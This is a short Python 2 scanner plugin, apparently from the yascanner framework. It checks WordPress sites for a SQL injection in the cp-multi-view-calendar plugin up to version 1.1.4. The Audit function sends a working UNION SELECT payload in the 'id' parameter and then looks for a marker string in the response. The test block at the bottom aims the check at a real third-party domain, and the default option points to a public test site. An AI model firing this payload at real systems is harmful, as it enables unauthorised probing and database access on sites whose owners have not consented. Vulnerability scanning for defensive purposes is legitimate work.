#!/usr/bin/python2.7
#coding:utf-8

import requests
import re
from dummy import *

info = {
	'NAME':'WordPress cp-multi-view-calendar <= 1.1.4 - SQL Injection',
	'AUTHOR':'WJK,yangbh,lkz',
	'TIME':'20150320',
	'WEB':'https://www.yascanner.com/#!/n/120',
	'DESCRIPTION':''
}
opts = [
	['url','http://testasp.vulnweb.com','target url']
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms']=='Wordpress':
		return True
	return False

def Audit(services):
	url = services['url'] + '/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT%280x7167676a71,0x4d7059554473416c6d79,0x7170777871%29,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'
	try:		
		rq = requests.get(url)
		res= rq.text
		m = re.search("qggjqMpYUDsAlmyqpwxq",res)
		if m:
			security_hole(url+'WordPress cp-multi-view-calendar <= 1.1.4 - SQL Injection')
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
